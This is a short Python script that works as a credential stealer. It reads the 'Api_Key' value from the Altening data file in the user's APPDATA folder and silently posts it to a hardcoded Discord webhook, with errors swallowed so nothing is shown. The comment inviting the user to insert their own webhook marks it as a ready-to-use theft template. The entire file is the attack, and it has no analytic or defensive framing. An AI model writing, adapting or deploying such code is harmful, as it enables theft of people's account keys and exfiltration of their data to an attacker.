import os
import json
import requests

#enter you webhook url here
WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/847995389097017344/H_od7O2S49cfV8dlOnX7cEE8z-2XuYSFbjDEbmiglcjgp-p05SlcFWPOmi9Z_va5hYne"

def main():

    path = os.getenv('APPDATA') + '\\altening\\data.json'
    if os.path.exists(path):
        with open(path) as path:
            api = json.load(path)
    key = api.get("Api_Key")

    try:
        requests.post(WEBHOOK_URL,json = {'content' : f'```{key}```'} )
    except:
        pass

if __name__ == '__main__':
    main()


